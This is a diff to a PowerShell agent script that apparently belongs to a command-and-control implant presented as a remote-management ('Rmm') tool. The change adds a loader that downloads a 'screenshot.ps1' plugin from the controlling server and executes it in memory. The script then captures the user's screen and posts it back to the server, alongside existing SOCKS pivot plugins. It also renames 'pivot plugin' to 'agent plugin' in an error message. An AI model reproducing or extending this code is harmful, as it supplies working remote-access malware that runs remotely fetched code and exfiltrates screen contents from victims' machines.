@@ -131,6 +131,7 @@ $script:RmmSocksWorker = @{
 }
 $script:RmmSocksLogQueue = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
 $script:RmmSocksPluginLoaded = $false
+$script:RmmScreenshotPluginLoaded = $false
 
 if ($script:UsePersistentHttp) {
     $script:RmmCookieContainer = New-Object System.Net.CookieContainer
@@ -760,7 +761,7 @@ function Get-RmmCmdSocksActive {
 function Get-RmmPluginScript {
     param([Parameter(Mandatory = $true)][string]$PluginName)
     if ($PluginName -notmatch '^[A-Za-z0-9][A-Za-z0-9._-]{0,127}\.ps1$') {
-        throw "Invalid pivot plugin name: $PluginName"
+        throw "Invalid agent plugin name: $PluginName"
     }
     $headers = Get-RmmRequestHeaders
     $uri = "$u/tools/plugins/$PluginName?id=$([uri]::EscapeDataString($sessionId))"
@@ -783,6 +784,24 @@ function Ensure-RmmSocksPlugin {
             }
         }
         $script:RmmSocksPluginLoaded = $true
+        return $true
+    } catch {
+        return $false
+    }
+}
+
+function Ensure-RmmScreenshotPlugin {
+    if ($script:RmmScreenshotPluginLoaded) { return $true }
+    try {
+        $source = Get-RmmPluginScript -PluginName 'screenshot.ps1'
+        if ([string]::IsNullOrWhiteSpace($source)) {
+            throw 'Screenshot plugin is empty'
+        }
+        . ([scriptblock]::Create($source))
+        if (-not (Get-Command 'Invoke-RmmScreenshotPlugin' -CommandType Function -ErrorAction SilentlyContinue)) {
+            throw 'Screenshot plugin is missing Invoke-RmmScreenshotPlugin'
+        }
+        $script:RmmScreenshotPluginLoaded = $true
         return $true
     } catch {
         return $false
@@ -2066,24 +2085,14 @@ while ($true) {
                 }
             }
             elseif ($command -eq "__SCREENSHOT__") {
-                # Take screenshot
                 try {
-                    Add-Type -AssemblyName System.Windows.Forms
-                    Add-Type -AssemblyName System.Drawing
-                    
-                    $screen = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize
-                    $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
-                    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-                    $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
-                    
-                    $memoryStream = New-Object System.IO.MemoryStream
-                    $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
-                    $screenshotBase64 = [Convert]::ToBase64String($memoryStream.ToArray())
-                    
-                    $graphics.Dispose()
-                    $bitmap.Dispose()
-                    $memoryStream.Dispose()
-                    
+                    if (-not (Ensure-RmmScreenshotPlugin)) {
+                        throw 'Screenshot plugin is unavailable'
+                    }
+                    $screenshotBase64 = [string](Invoke-RmmScreenshotPlugin)
+                    if ([string]::IsNullOrWhiteSpace($screenshotBase64)) {
+                        throw 'Screenshot plugin returned no data'
+                    }
                     $resultUrl = "$u/result?id=$sessionId&type=screenshot"
                     Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $screenshotBase64 -Headers $headers -RestErrorAction Stop
                     Write-Host "[+] Screenshot captured and sent" -ForegroundColor Green
